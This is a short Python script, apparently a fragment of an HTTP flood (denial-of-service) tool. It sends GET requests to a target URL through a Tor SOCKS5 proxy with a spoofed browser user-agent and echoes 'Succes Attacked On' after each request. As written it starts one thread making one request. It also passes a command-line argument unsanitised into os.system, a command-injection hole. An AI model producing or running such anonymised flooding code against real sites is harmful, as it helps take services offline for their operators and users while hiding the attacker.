import requests
import sys
import os
from threading import Thread
from time import sleep

url = sys.argv[1]
proxyTor = "socks5://127.0.0.1:" + sys.argv[2]
optionsProxy = {"https":proxyTor,
                 "http":proxyTor}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'
}                
def threaded_function(arg):
    for i in range(arg):
        requests.get(url,proxies=optionsProxy,headers=headers)
        os.system("echo Succes Attacked On "+sys.argv[2])


thread = Thread(target = threaded_function, args = (1,))
thread.start()

